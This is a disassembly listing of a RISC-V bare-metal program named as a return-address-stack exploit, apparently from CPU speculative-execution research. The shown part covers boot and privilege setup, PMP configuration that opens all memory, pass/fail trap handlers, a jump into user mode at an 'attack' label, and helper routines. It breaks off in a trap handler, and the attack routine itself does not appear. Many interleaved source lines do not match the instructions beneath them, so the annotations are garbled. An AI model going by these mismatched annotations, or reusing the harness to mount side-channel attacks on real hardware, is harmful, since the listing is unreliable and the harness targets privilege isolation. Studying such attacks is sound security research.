
/mnt/milesan-meta/pocs/specdoctor/ras-attack/Template/ras-exploit.riscv:     file format elf64-littleriscv


Disassembly of section .text.init:

0000000080000000 <_start>:

    .section ".text.init","ax",@progbits
    .global _start
    .align 2
_start:
    j handle_reset
    80000000:	0300006f          	j	80000030 <handle_reset>

0000000080000004 <nmi_vector>:

    /* NMI vector */
    .align 2
nmi_vector:
    j nmi_vector
    80000004:	0000006f          	j	80000004 <nmi_vector>

0000000080000008 <mtvec_handler>:

    .global mtvec_handler
    .align 2
mtvec_handler:
    li gp, FAIL
    80000008:	00300193          	li	gp,3
    la a0, tohost
    8000000c:	00001517          	auipc	a0,0x1
    80000010:	ff450513          	add	a0,a0,-12 # 80001000 <tohost>
1:  STORE gp, 0(a0)
    80000014:	00353023          	sd	gp,0(a0)
    j 1b
    80000018:	ffdff06f          	j	80000014 <mtvec_handler+0xc>

000000008000001c <stvec_handler>:

    .global stvec_handler
    .align 2
stvec_handler:
    li gp, PASS
    8000001c:	00100193          	li	gp,1
    la a0, tohost
    80000020:	00001517          	auipc	a0,0x1
    80000024:	fe050513          	add	a0,a0,-32 # 80001000 <tohost>
1:  STORE gp, 0(a0)
    80000028:	00353023          	sd	gp,0(a0)
    j 1b
    8000002c:	ffdff06f          	j	80000028 <stvec_handler+0xc>

0000000080000030 <handle_reset>:


handle_reset:
    csrwi pmpcfg0, 0
    80000030:	3a005073          	csrw	pmpcfg0,0
    csrwi mstatus, 0
    80000034:	30005073          	csrw	mstatus,0

    /* Init xregs */
    li x1,  0
    80000038:	00000093          	li	ra,0
    li x2,  0
    8000003c:	00000113          	li	sp,0
    li x3,  0
    80000040:	00000193          	li	gp,0
    li x4,  0
    80000044:	00000213          	li	tp,0
    li x5,  0
    80000048:	00000293          	li	t0,0
    li x6,  0
    8000004c:	00000313          	li	t1,0
    li x7,  0
    80000050:	00000393          	li	t2,0
    li x8,  0
    80000054:	00000413          	li	s0,0
    li x9,  0
    80000058:	00000493          	li	s1,0
    li x10, 0
    8000005c:	00000513          	li	a0,0
    li x11, 0
    80000060:	00000593          	li	a1,0
    li x12, 0
    80000064:	00000613          	li	a2,0
    li x13, 0
    80000068:	00000693          	li	a3,0
    li x14, 0
    8000006c:	00000713          	li	a4,0
    li x15, 0
    80000070:	00000793          	li	a5,0
    li x16, 0
    80000074:	00000813          	li	a6,0
    li x17, 0
    80000078:	00000893          	li	a7,0
    li x18, 0
    8000007c:	00000913          	li	s2,0
    li x19, 0
    80000080:	00000993          	li	s3,0
    li x20, 0
    80000084:	00000a13          	li	s4,0
    li x21, 0
    80000088:	00000a93          	li	s5,0
    li x22, 0
    8000008c:	00000b13          	li	s6,0
    li x23, 0
    80000090:	00000b93          	li	s7,0
    li x24, 0
    80000094:	00000c13          	li	s8,0
    li x25, 0
    80000098:	00000c93          	li	s9,0
    li x26, 0
    8000009c:	00000d13          	li	s10,0
    li x27, 0
    800000a0:	00000d93          	li	s11,0
    li x28, 0
    800000a4:	00000e13          	li	t3,0
    li x29, 0
    800000a8:	00000e93          	li	t4,0
    li x30, 0
    800000ac:	00000f13          	li	t5,0
    li x31, 0
    800000b0:	00000f93          	li	t6,0

    li t0, MSTATUS_FS
    800000b4:	000062b7          	lui	t0,0x6
    csrs mstatus, t0
    800000b8:	3002a073          	csrs	mstatus,t0

    la t0, 1f
    800000bc:	00000297          	auipc	t0,0x0
    800000c0:	08c28293          	add	t0,t0,140 # 80000148 <handle_reset+0x118>
    csrw mtvec, t0
    800000c4:	30529073          	csrw	mtvec,t0
    fmv.s.x f0, x0
    800000c8:	f0000053          	fmv.w.x	ft0,zero
    fmv.s.x f1, x0
    800000cc:	f00000d3          	fmv.w.x	ft1,zero
    fmv.s.x f2, x0
    800000d0:	f0000153          	fmv.w.x	ft2,zero
    fmv.s.x f3, x0
    800000d4:	f00001d3          	fmv.w.x	ft3,zero
    fmv.s.x f4, x0
    800000d8:	f0000253          	fmv.w.x	ft4,zero
    fmv.s.x f5, x0
    800000dc:	f00002d3          	fmv.w.x	ft5,zero
    fmv.s.x f6, x0
    800000e0:	f0000353          	fmv.w.x	ft6,zero
    fmv.s.x f7, x0
    800000e4:	f00003d3          	fmv.w.x	ft7,zero
    fmv.s.x f8, x0
    800000e8:	f0000453          	fmv.w.x	fs0,zero
    fmv.s.x f9, x0
    800000ec:	f00004d3          	fmv.w.x	fs1,zero
    fmv.s.x f10,x0
    800000f0:	f0000553          	fmv.w.x	fa0,zero
    fmv.s.x f11,x0
    800000f4:	f00005d3          	fmv.w.x	fa1,zero
    fmv.s.x f12,x0
    800000f8:	f0000653          	fmv.w.x	fa2,zero
    fmv.s.x f13,x0
    800000fc:	f00006d3          	fmv.w.x	fa3,zero
    fmv.s.x f14,x0
    80000100:	f0000753          	fmv.w.x	fa4,zero
    fmv.s.x f15,x0
    80000104:	f00007d3          	fmv.w.x	fa5,zero
    fmv.s.x f16,x0
    80000108:	f0000853          	fmv.w.x	fa6,zero
    fmv.s.x f17,x0
    8000010c:	f00008d3          	fmv.w.x	fa7,zero
    fmv.s.x f18,x0
    80000110:	f0000953          	fmv.w.x	fs2,zero
    fmv.s.x f19,x0
    80000114:	f00009d3          	fmv.w.x	fs3,zero
    fmv.s.x f20,x0
    80000118:	f0000a53          	fmv.w.x	fs4,zero
    fmv.s.x f21,x0
    8000011c:	f0000ad3          	fmv.w.x	fs5,zero
    fmv.s.x f22,x0
    80000120:	f0000b53          	fmv.w.x	fs6,zero
    fmv.s.x f23,x0
    80000124:	f0000bd3          	fmv.w.x	fs7,zero
    fmv.s.x f24,x0
    80000128:	f0000c53          	fmv.w.x	fs8,zero
    fmv.s.x f25,x0
    8000012c:	f0000cd3          	fmv.w.x	fs9,zero
    fmv.s.x f26,x0
    80000130:	f0000d53          	fmv.w.x	fs10,zero
    fmv.s.x f27,x0
    80000134:	f0000dd3          	fmv.w.x	fs11,zero
    fmv.s.x f28,x0
    80000138:	f0000e53          	fmv.w.x	ft8,zero
    fmv.s.x f29,x0
    8000013c:	f0000ed3          	fmv.w.x	ft9,zero
    fmv.s.x f30,x0
    80000140:	f0000f53          	fmv.w.x	ft10,zero
    fmv.s.x f31,x0
    80000144:	f0000fd3          	fmv.w.x	ft11,zero
1:

    la t0, mtvec_handler
    80000148:	00000297          	auipc	t0,0x0
    8000014c:	ec028293          	add	t0,t0,-320 # 80000008 <mtvec_handler>
    csrw mtvec, t0
    80000150:	30529073          	csrw	mtvec,t0
    la t0, stvec_handler
    80000154:	00000297          	auipc	t0,0x0
    80000158:	ec828293          	add	t0,t0,-312 # 8000001c <stvec_handler>
    csrw stvec, t0
    8000015c:	10529073          	csrw	stvec,t0

    la sp, STACK_TOP
    80000160:	00008117          	auipc	sp,0x8
    80000164:	ea010113          	add	sp,sp,-352 # 80008000 <_end+0x1000>
    la tp, THREAD_TOP
    80000168:	00009217          	auipc	tp,0x9
    8000016c:	e9820213          	add	tp,tp,-360 # 80009000 <_end+0x2000>

    /* Memory layout configuration */
    call pmp_boot
    80000170:	6d9000ef          	jal	80001048 <pmp_boot>
    call vm_boot
    80000174:	3e4020ef          	jal	80002558 <vm_boot>

    /* Enable S-mode cycle reading */
    li a0, 1
    80000178:	00100513          	li	a0,1
    csrs mcounteren, a0
    8000017c:	30652073          	csrs	mcounteren,a0

    /* Enable U-mode cycle reading */
	csrs scounteren, a0
    80000180:	10652073          	csrs	scounteren,a0

    li a0, MSTATUS_MPP
    80000184:	00002537          	lui	a0,0x2
    80000188:	8005051b          	addw	a0,a0,-2048 # 1800 <threadsense.2+0x177c>
    csrc mstatus, a0
    8000018c:	30053073          	csrc	mstatus,a0

    /* Settings for User level execution */
	li a0, MSTATUS_MPP & (MSTATUS_MPP >> 1)
    80000190:	00001537          	lui	a0,0x1
    80000194:	8005051b          	addw	a0,a0,-2048 # 800 <threadsense.2+0x77c>
    csrs mstatus, a0
    80000198:	30052073          	csrs	mstatus,a0

    la t0, stvec_handler
    8000019c:	00000297          	auipc	t0,0x0
    800001a0:	e8028293          	add	t0,t0,-384 # 8000001c <stvec_handler>
    csrw stvec, t0
    800001a4:	10529073          	csrw	stvec,t0
    la sp, STACK_TOP
    800001a8:	00008117          	auipc	sp,0x8
    800001ac:	e5810113          	add	sp,sp,-424 # 80008000 <_end+0x1000>

    la t0, attack
    800001b0:	00200297          	auipc	t0,0x200
    800001b4:	e5028293          	add	t0,t0,-432 # 80200000 <attack>
    csrw mepc, t0
    800001b8:	34129073          	csrw	mepc,t0
    mret
    800001bc:	30200073          	mret

Disassembly of section .tohost:

0000000080001000 <tohost>:
	...

0000000080001040 <fromhost>:
	...

Disassembly of section .text:

0000000080001048 <pmp_boot>:
#include "vm.h"

// Aligned to page size
extern uint8_t secret[PGSIZE];

void pmp_boot() {
    80001048:	fe010113          	add	sp,sp,-32
    8000104c:	00813c23          	sd	s0,24(sp)
    80001050:	02010413          	add	s0,sp,32
    /*  Set lowest pmp to allow all address range */
    uintptr_t pmpc = PMP_NAPOT | PMP_R | PMP_W | PMP_X;
    80001054:	01f00793          	li	a5,31
    80001058:	fef43423          	sd	a5,-24(s0)
    uintptr_t pmpa = ((uintptr_t)1 << (__riscv_xlen == 32 ? 31 : 53)) - 1;
    8000105c:	fff00793          	li	a5,-1
    80001060:	00b7d793          	srl	a5,a5,0xb
    80001064:	fef43023          	sd	a5,-32(s0)
    asm volatile("la t0, 1f\n\t"
    80001068:	fe843783          	ld	a5,-24(s0)
    8000106c:	fe043703          	ld	a4,-32(s0)
    80001070:	00000297          	auipc	t0,0x0
    80001074:	01c28293          	add	t0,t0,28 # 8000108c <pmp_boot+0x44>
    80001078:	305292f3          	csrrw	t0,mtvec,t0
    8000107c:	3b771073          	csrw	pmpaddr7,a4
    80001080:	00078513          	mv	a0,a5
    80001084:	03851513          	sll	a0,a0,0x38
    80001088:	3a051073          	csrw	pmpcfg0,a0
    8000108c:	30529073          	csrw	mtvec,t0
    /* pmpa = ((uintptr_t) secret | (((uintptr_t)1 << 11) - 1)) >> 2; */
    /* asm volatile("csrw pmpaddr0, %1\n\t" */
    /*              "csrs pmpcfg0, %0\n\t" */
    /*              : : "r" (pmpc), "r" (pmpa)); */

    return;
    80001090:	00000013          	nop
}
    80001094:	01813403          	ld	s0,24(sp)
    80001098:	02010113          	add	sp,sp,32
    8000109c:	00008067          	ret

00000000800010a0 <printArray>:
void __attribute__((noreturn)) tohost_exit(uintptr_t code)
{
  tohost = (code << 1) | 1;
  while (1);
}

    800010a0:	fd010113          	add	sp,sp,-48
    800010a4:	02813423          	sd	s0,40(sp)
    800010a8:	03010413          	add	s0,sp,48
    800010ac:	fea43423          	sd	a0,-24(s0)
    800010b0:	00058793          	mv	a5,a1
    800010b4:	fcc43c23          	sd	a2,-40(s0)
    800010b8:	fef42223          	sw	a5,-28(s0)
  tohost_exit(1337);
}

void exit(int code)
{
  tohost_exit(code);
    800010bc:	00000013          	nop
    800010c0:	02813403          	ld	s0,40(sp)
    800010c4:	03010113          	add	sp,sp,48
    800010c8:	00008067          	ret

00000000800010cc <printDoubleArray>:
}

void abort()
    800010cc:	fd010113          	add	sp,sp,-48
    800010d0:	02813423          	sd	s0,40(sp)
    800010d4:	03010413          	add	s0,sp,48
    800010d8:	fea43423          	sd	a0,-24(s0)
    800010dc:	00058793          	mv	a5,a1
    800010e0:	fcc43c23          	sd	a2,-40(s0)
    800010e4:	fef42223          	sw	a5,-28(s0)
}

void printstr(const char* s)
{
  syscall(SYS_write, 1, (uintptr_t)s, strlen(s));
}
    800010e8:	00000013          	nop
    800010ec:	02813403          	ld	s0,40(sp)
    800010f0:	03010113          	add	sp,sp,48
    800010f4:	00008067          	ret

00000000800010f8 <verify>:

/* int __attribute__((weak)) main(int argc, char** argv) */
/* { */
    800010f8:	fb010113          	add	sp,sp,-80
    800010fc:	04813423          	sd	s0,72(sp)
    80001100:	05010413          	add	s0,sp,80
    80001104:	00050793          	mv	a5,a0
    80001108:	fcb43023          	sd	a1,-64(s0)
    8000110c:	fac43c23          	sd	a2,-72(s0)
    80001110:	fcf42623          	sw	a5,-52(s0)
/*   // single-threaded programs override this function. */
/*   printstr("Implement main(), foo!\n"); */
/*   return -1; */
    80001114:	fe042623          	sw	zero,-20(s0)
    80001118:	0c80006f          	j	800011e0 <verify+0xe8>
/* } */

    8000111c:	fec42783          	lw	a5,-20(s0)
    80001120:	00279793          	sll	a5,a5,0x2
    80001124:	fc043703          	ld	a4,-64(s0)
    80001128:	00f707b3          	add	a5,a4,a5
    8000112c:	0007a783          	lw	a5,0(a5)
    80001130:	fef42423          	sw	a5,-24(s0)
    80001134:	fec42783          	lw	a5,-20(s0)
    80001138:	00178793          	add	a5,a5,1
    8000113c:	00279793          	sll	a5,a5,0x2
    80001140:	fc043703          	ld	a4,-64(s0)
    80001144:	00f707b3          	add	a5,a4,a5
    80001148:	0007a783          	lw	a5,0(a5)
    8000114c:	fef42223          	sw	a5,-28(s0)
/* void _init(int cid, int nc) */
    80001150:	fec42783          	lw	a5,-20(s0)
    80001154:	00279793          	sll	a5,a5,0x2
    80001158:	fb843703          	ld	a4,-72(s0)
    8000115c:	00f707b3          	add	a5,a4,a5
    80001160:	0007a783          	lw	a5,0(a5)
    80001164:	fef42023          	sw	a5,-32(s0)
    80001168:	fec42783          	lw	a5,-20(s0)
    8000116c:	00178793          	add	a5,a5,1
    80001170:	00279793          	sll	a5,a5,0x2
    80001174:	fb843703          	ld	a4,-72(s0)
    80001178:	00f707b3          	add	a5,a4,a5
    8000117c:	0007a783          	lw	a5,0(a5)
    80001180:	fcf42e23          	sw	a5,-36(s0)
/* { */
    80001184:	fe842783          	lw	a5,-24(s0)
    80001188:	00078713          	mv	a4,a5
    8000118c:	fe042783          	lw	a5,-32(s0)
    80001190:	0007071b          	sext.w	a4,a4
    80001194:	0007879b          	sext.w	a5,a5
    80001198:	00f70a63          	beq	a4,a5,800011ac <verify+0xb4>
    8000119c:	fec42783          	lw	a5,-20(s0)
    800011a0:	0017879b          	addw	a5,a5,1
    800011a4:	0007879b          	sext.w	a5,a5
    800011a8:	0b80006f          	j	80001260 <verify+0x168>
/*   // only single-threaded programs should ever get here. */
    800011ac:	fe442783          	lw	a5,-28(s0)
    800011b0:	00078713          	mv	a4,a5
    800011b4:	fdc42783          	lw	a5,-36(s0)
    800011b8:	0007071b          	sext.w	a4,a4
    800011bc:	0007879b          	sext.w	a5,a5
    800011c0:	00f70a63          	beq	a4,a5,800011d4 <verify+0xdc>
    800011c4:	fec42783          	lw	a5,-20(s0)
    800011c8:	0027879b          	addw	a5,a5,2
    800011cc:	0007879b          	sext.w	a5,a5
    800011d0:	0900006f          	j	80001260 <verify+0x168>
/*   return -1; */
    800011d4:	fec42783          	lw	a5,-20(s0)
    800011d8:	0027879b          	addw	a5,a5,2
    800011dc:	fef42623          	sw	a5,-20(s0)
    800011e0:	fcc42783          	lw	a5,-52(s0)
    800011e4:	01f7d71b          	srlw	a4,a5,0x1f
    800011e8:	00f707bb          	addw	a5,a4,a5
    800011ec:	4017d79b          	sraw	a5,a5,0x1
    800011f0:	0007879b          	sext.w	a5,a5
    800011f4:	0017979b          	sllw	a5,a5,0x1
    800011f8:	0007871b          	sext.w	a4,a5
    800011fc:	fec42783          	lw	a5,-20(s0)
    80001200:	0007879b          	sext.w	a5,a5
    80001204:	f0e7cce3          	blt	a5,a4,8000111c <verify+0x24>
/*   int ret = main(0, 0); */

    80001208:	fcc42783          	lw	a5,-52(s0)
    8000120c:	0017f793          	and	a5,a5,1
    80001210:	0007879b          	sext.w	a5,a5
    80001214:	04078463          	beqz	a5,8000125c <verify+0x164>
    80001218:	fcc42783          	lw	a5,-52(s0)
    8000121c:	00279793          	sll	a5,a5,0x2
    80001220:	ffc78793          	add	a5,a5,-4
    80001224:	fc043703          	ld	a4,-64(s0)
    80001228:	00f707b3          	add	a5,a4,a5
    8000122c:	0007a783          	lw	a5,0(a5)
    80001230:	0007869b          	sext.w	a3,a5
    80001234:	fcc42783          	lw	a5,-52(s0)
    80001238:	00279793          	sll	a5,a5,0x2
    8000123c:	ffc78793          	add	a5,a5,-4
    80001240:	fb843703          	ld	a4,-72(s0)
    80001244:	00f707b3          	add	a5,a4,a5
    80001248:	0007a783          	lw	a5,0(a5)
    8000124c:	00068713          	mv	a4,a3
    80001250:	00f70663          	beq	a4,a5,8000125c <verify+0x164>
/*   exit(ret); */
    80001254:	fcc42783          	lw	a5,-52(s0)
    80001258:	0080006f          	j	80001260 <verify+0x168>
/* } */
    8000125c:	00000793          	li	a5,0

    80001260:	00078513          	mv	a0,a5
    80001264:	04813403          	ld	s0,72(sp)
    80001268:	05010113          	add	sp,sp,80
    8000126c:	00008067          	ret

0000000080001270 <verifyDouble>:
#undef putchar
int putchar(int ch)
{
    80001270:	fa010113          	add	sp,sp,-96
    80001274:	04813c23          	sd	s0,88(sp)
    80001278:	06010413          	add	s0,sp,96
    8000127c:	00050793          	mv	a5,a0
    80001280:	fab43823          	sd	a1,-80(s0)
    80001284:	fac43423          	sd	a2,-88(s0)
    80001288:	faf42e23          	sw	a5,-68(s0)
  static __thread char buf[64] __attribute__((aligned(64)));
  static __thread int buflen = 0;

    8000128c:	fe042623          	sw	zero,-20(s0)
    80001290:	0dc0006f          	j	8000136c <verifyDouble+0xfc>
  buf[buflen++] = ch;

    80001294:	fec42783          	lw	a5,-20(s0)
    80001298:	00379793          	sll	a5,a5,0x3
    8000129c:	fb043703          	ld	a4,-80(s0)
    800012a0:	00f707b3          	add	a5,a4,a5
    800012a4:	0007b787          	fld	fa5,0(a5)
    800012a8:	fef43027          	fsd	fa5,-32(s0)
    800012ac:	fec42783          	lw	a5,-20(s0)
    800012b0:	00178793          	add	a5,a5,1
    800012b4:	00379793          	sll	a5,a5,0x3
    800012b8:	fb043703          	ld	a4,-80(s0)
    800012bc:	00f707b3          	add	a5,a4,a5
    800012c0:	0007b787          	fld	fa5,0(a5)
    800012c4:	fcf43c27          	fsd	fa5,-40(s0)
  if (ch == '\n' || buflen == sizeof(buf))
    800012c8:	fec42783          	lw	a5,-20(s0)
    800012cc:	00379793          	sll	a5,a5,0x3
    800012d0:	fa843703          	ld	a4,-88(s0)
    800012d4:	00f707b3          	add	a5,a4,a5
    800012d8:	0007b787          	fld	fa5,0(a5)
    800012dc:	fcf43827          	fsd	fa5,-48(s0)
    800012e0:	fec42783          	lw	a5,-20(s0)
    800012e4:	00178793          	add	a5,a5,1
    800012e8:	00379793          	sll	a5,a5,0x3
    800012ec:	fa843703          	ld	a4,-88(s0)
    800012f0:	00f707b3          	add	a5,a4,a5
    800012f4:	0007b787          	fld	fa5,0(a5)
    800012f8:	fcf43427          	fsd	fa5,-56(s0)
  {
    800012fc:	fe043707          	fld	fa4,-32(s0)
    80001300:	fd043787          	fld	fa5,-48(s0)
    80001304:	a2f727d3          	feq.d	a5,fa4,fa5
    80001308:	00f037b3          	snez	a5,a5
    8000130c:	0ff7f793          	zext.b	a5,a5
    80001310:	fcf42223          	sw	a5,-60(s0)
    80001314:	fd843707          	fld	fa4,-40(s0)
    80001318:	fc843787          	fld	fa5,-56(s0)
    8000131c:	a2f727d3          	feq.d	a5,fa4,fa5
    80001320:	00f037b3          	snez	a5,a5
    80001324:	0ff7f793          	zext.b	a5,a5
    80001328:	fcf42023          	sw	a5,-64(s0)
    syscall(SYS_write, 1, (uintptr_t)buf, buflen);
    8000132c:	fc442783          	lw	a5,-60(s0)
    80001330:	00078713          	mv	a4,a5
    80001334:	fc042783          	lw	a5,-64(s0)
    80001338:	00f777b3          	and	a5,a4,a5
    8000133c:	0007879b          	sext.w	a5,a5
    80001340:	02079063          	bnez	a5,80001360 <verifyDouble+0xf0>
    80001344:	fec42783          	lw	a5,-20(s0)
    80001348:	0017879b          	addw	a5,a5,1
    8000134c:	0007879b          	sext.w	a5,a5
    80001350:	fc442703          	lw	a4,-60(s0)
    80001354:	00f707bb          	addw	a5,a4,a5
    80001358:	0007879b          	sext.w	a5,a5
    8000135c:	08c0006f          	j	800013e8 <verifyDouble+0x178>

    80001360:	fec42783          	lw	a5,-20(s0)
    80001364:	0027879b          	addw	a5,a5,2
    80001368:	fef42623          	sw	a5,-20(s0)
    8000136c:	fbc42783          	lw	a5,-68(s0)
    80001370:	01f7d71b          	srlw	a4,a5,0x1f
    80001374:	00f707bb          	addw	a5,a4,a5
    80001378:	4017d79b          	sraw	a5,a5,0x1
    8000137c:	0007879b          	sext.w	a5,a5
    80001380:	0017979b          	sllw	a5,a5,0x1
    80001384:	0007871b          	sext.w	a4,a5
    80001388:	fec42783          	lw	a5,-20(s0)
    8000138c:	0007879b          	sext.w	a5,a5
    80001390:	f0e7c2e3          	blt	a5,a4,80001294 <verifyDouble+0x24>
    buflen = 0;
  }
    80001394:	fbc42783          	lw	a5,-68(s0)
    80001398:	0017f793          	and	a5,a5,1
    8000139c:	0007879b          	sext.w	a5,a5
    800013a0:	04078263          	beqz	a5,800013e4 <verifyDouble+0x174>
    800013a4:	fbc42783          	lw	a5,-68(s0)
    800013a8:	00379793          	sll	a5,a5,0x3
    800013ac:	ff878793          	add	a5,a5,-8
    800013b0:	fb043703          	ld	a4,-80(s0)
    800013b4:	00f707b3          	add	a5,a4,a5
    800013b8:	0007b707          	fld	fa4,0(a5)
    800013bc:	fbc42783          	lw	a5,-68(s0)
    800013c0:	00379793          	sll	a5,a5,0x3
    800013c4:	ff878793          	add	a5,a5,-8
    800013c8:	fa843703          	ld	a4,-88(s0)
    800013cc:	00f707b3          	add	a5,a4,a5
    800013d0:	0007b787          	fld	fa5,0(a5)
    800013d4:	a2f727d3          	feq.d	a5,fa4,fa5
    800013d8:	00079663          	bnez	a5,800013e4 <verifyDouble+0x174>

    800013dc:	fbc42783          	lw	a5,-68(s0)
    800013e0:	0080006f          	j	800013e8 <verifyDouble+0x178>
  return 0;
    800013e4:	00000793          	li	a5,0
}
    800013e8:	00078513          	mv	a0,a5
    800013ec:	05813403          	ld	s0,88(sp)
    800013f0:	06010113          	add	sp,sp,96
    800013f4:	00008067          	ret

00000000800013f8 <barrier>:

void printhex(uint64_t x)
{
    800013f8:	fe010113          	add	sp,sp,-32
    800013fc:	00813c23          	sd	s0,24(sp)
    80001400:	02010413          	add	s0,sp,32
    80001404:	00050793          	mv	a5,a0
    80001408:	fef42623          	sw	a5,-20(s0)
  char str[17];
  int i;
  for (i = 0; i < 16; i++)
  {
    str[15-i] = (x & 0xF) + ((x & 0xF) < 10 ? '0' : 'a'-10);
    8000140c:	0ff0000f          	fence
    x >>= 4;
  }
    80001410:	00022783          	lw	a5,0(tp) # 0 <threadsense.5>
    80001414:	0017b793          	seqz	a5,a5
    80001418:	0ff7f793          	zext.b	a5,a5
    8000141c:	0007871b          	sext.w	a4,a5
    80001420:	00e22023          	sw	a4,0(tp) # 0 <threadsense.5>
  str[16] = 0;
    80001424:	00001797          	auipc	a5,0x1
    80001428:	75c78793          	add	a5,a5,1884 # 80002b80 <count.2>
    8000142c:	00100713          	li	a4,1
    80001430:	0f50000f          	fence	iorw,ow
    80001434:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80001438:	0006879b          	sext.w	a5,a3
    8000143c:	0007871b          	sext.w	a4,a5
    80001440:	fec42783          	lw	a5,-20(s0)
    80001444:	fff7879b          	addw	a5,a5,-1
    80001448:	0007879b          	sext.w	a5,a5
    8000144c:	02f71263          	bne	a4,a5,80001470 <barrier+0x78>

  printstr(str);
    80001450:	00001797          	auipc	a5,0x1
    80001454:	73078793          	add	a5,a5,1840 # 80002b80 <count.2>
    80001458:	0007a023          	sw	zero,0(a5)
}
    8000145c:	00022703          	lw	a4,0(tp) # 0 <threadsense.5>
    80001460:	00001797          	auipc	a5,0x1
    80001464:	72478793          	add	a5,a5,1828 # 80002b84 <sense.1>
    80001468:	00e7a023          	sw	a4,0(a5)
    8000146c:	0200006f          	j	8000148c <barrier+0x94>

static inline void printnum(void (*putch)(int, void**), void **putdat,
    80001470:	00000013          	nop
    80001474:	00001797          	auipc	a5,0x1
    80001478:	71078793          	add	a5,a5,1808 # 80002b84 <sense.1>
    8000147c:	0007a783          	lw	a5,0(a5)
    80001480:	0007871b          	sext.w	a4,a5
    80001484:	00022783          	lw	a5,0(tp) # 0 <threadsense.5>
    80001488:	fef716e3          	bne	a4,a5,80001474 <barrier+0x7c>
                    unsigned long long num, unsigned base, int width, int padc)
{
  unsigned digs[sizeof(num)*CHAR_BIT];
    8000148c:	0ff0000f          	fence
  int pos = 0;
    80001490:	00000013          	nop
    80001494:	01813403          	ld	s0,24(sp)
    80001498:	02010113          	add	sp,sp,32
    8000149c:	00008067          	ret

00000000800014a0 <lfsr>:

  while (1)
  {
    800014a0:	fd010113          	add	sp,sp,-48
    800014a4:	02813423          	sd	s0,40(sp)
    800014a8:	03010413          	add	s0,sp,48
    800014ac:	fca43c23          	sd	a0,-40(s0)
    digs[pos++] = num % base;
    800014b0:	fd843783          	ld	a5,-40(s0)
    800014b4:	0017d713          	srl	a4,a5,0x1
    800014b8:	fd843783          	ld	a5,-40(s0)
    800014bc:	00f747b3          	xor	a5,a4,a5
    800014c0:	0017f793          	and	a5,a5,1
    800014c4:	fef43423          	sd	a5,-24(s0)
    if (num < base)
    800014c8:	fd843783          	ld	a5,-40(s0)
    800014cc:	0017d713          	srl	a4,a5,0x1
    800014d0:	fe843783          	ld	a5,-24(s0)
    800014d4:	03e79793          	sll	a5,a5,0x3e
    800014d8:	00f767b3          	or	a5,a4,a5
      break;
    800014dc:	00078513          	mv	a0,a5
    800014e0:	02813403          	ld	s0,40(sp)
    800014e4:	03010113          	add	sp,sp,48
    800014e8:	00008067          	ret

00000000800014ec <lfsr10>:
    num /= base;
  }

    800014ec:	fd010113          	add	sp,sp,-48
    800014f0:	02813423          	sd	s0,40(sp)
    800014f4:	03010413          	add	s0,sp,48
    800014f8:	fca43c23          	sd	a0,-40(s0)
  while (width-- > pos)
    800014fc:	fd843783          	ld	a5,-40(s0)
    80001500:	00a7d713          	srl	a4,a5,0xa
    80001504:	fd843783          	ld	a5,-40(s0)
    80001508:	00f747b3          	xor	a5,a4,a5
    8000150c:	3ff7f793          	and	a5,a5,1023
    80001510:	fef43423          	sd	a5,-24(s0)
    putch(padc, putdat);
    80001514:	fd843783          	ld	a5,-40(s0)
    80001518:	00a7d713          	srl	a4,a5,0xa
    8000151c:	fe843783          	ld	a5,-24(s0)
    80001520:	03579793          	sll	a5,a5,0x35
    80001524:	00f767b3          	or	a5,a4,a5

    80001528:	00078513          	mv	a0,a5
    8000152c:	02813403          	ld	s0,40(sp)
    80001530:	03010113          	add	sp,sp,48
    80001534:	00008067          	ret

0000000080001538 <syscall>:
{
    80001538:	f5010113          	add	sp,sp,-176
    8000153c:	0a813423          	sd	s0,168(sp)
    80001540:	0b010413          	add	s0,sp,176
    80001544:	f6a43c23          	sd	a0,-136(s0)
    80001548:	f6b43823          	sd	a1,-144(s0)
    8000154c:	f6c43423          	sd	a2,-152(s0)
    80001550:	f6d43023          	sd	a3,-160(s0)
    80001554:	ff040793          	add	a5,s0,-16
    80001558:	f4f43c23          	sd	a5,-168(s0)
    8000155c:	f5843783          	ld	a5,-168(s0)
    80001560:	f9078793          	add	a5,a5,-112
    80001564:	03f78793          	add	a5,a5,63
    80001568:	0067d793          	srl	a5,a5,0x6
    8000156c:	00679793          	sll	a5,a5,0x6
  magic_mem[0] = which;
    80001570:	f7843703          	ld	a4,-136(s0)
    80001574:	00e7b023          	sd	a4,0(a5)
  magic_mem[1] = arg0;
    80001578:	f7043703          	ld	a4,-144(s0)
    8000157c:	00e7b423          	sd	a4,8(a5)
  magic_mem[2] = arg1;
    80001580:	f6843703          	ld	a4,-152(s0)
    80001584:	00e7b823          	sd	a4,16(a5)
  magic_mem[3] = arg2;
    80001588:	f6043703          	ld	a4,-160(s0)
    8000158c:	00e7bc23          	sd	a4,24(a5)
  __sync_synchronize();
    80001590:	0ff0000f          	fence
  tohost = (uintptr_t)magic_mem;
    80001594:	00078693          	mv	a3,a5
    80001598:	00000717          	auipc	a4,0x0
    8000159c:	a6870713          	add	a4,a4,-1432 # 80001000 <tohost>
    800015a0:	00d73023          	sd	a3,0(a4)
  while (fromhost == 0)
    800015a4:	00000013          	nop
    800015a8:	00000717          	auipc	a4,0x0
    800015ac:	a9870713          	add	a4,a4,-1384 # 80001040 <fromhost>
    800015b0:	00073703          	ld	a4,0(a4)
    800015b4:	fe070ae3          	beqz	a4,800015a8 <syscall+0x70>
  fromhost = 0;
    800015b8:	00000717          	auipc	a4,0x0
    800015bc:	a8870713          	add	a4,a4,-1400 # 80001040 <fromhost>
    800015c0:	00073023          	sd	zero,0(a4)
  __sync_synchronize();
    800015c4:	0ff0000f          	fence
  return magic_mem[0];
    800015c8:	0007b783          	ld	a5,0(a5)
}
    800015cc:	00078513          	mv	a0,a5
    800015d0:	0a813403          	ld	s0,168(sp)
    800015d4:	0b010113          	add	sp,sp,176
    800015d8:	00008067          	ret

00000000800015dc <tohost_exit>:
{
    800015dc:	fe010113          	add	sp,sp,-32
    800015e0:	00813c23          	sd	s0,24(sp)
    800015e4:	02010413          	add	s0,sp,32
    800015e8:	fea43423          	sd	a0,-24(s0)
  tohost = (code << 1) | 1;
    800015ec:	fe843783          	ld	a5,-24(s0)
    800015f0:	00179793          	sll	a5,a5,0x1
    800015f4:	0017e713          	or	a4,a5,1
    800015f8:	00000797          	auipc	a5,0x0
    800015fc:	a0878793          	add	a5,a5,-1528 # 80001000 <tohost>
    80001600:	00e7b023          	sd	a4,0(a5)
  while (1);
    80001604:	00000013          	nop
    80001608:	ffdff06f          	j	80001604 <tohost_exit+0x28>

000000008000160c <handle_trap>:
{
    8000160c:	fd010113          	add	sp,sp,-48
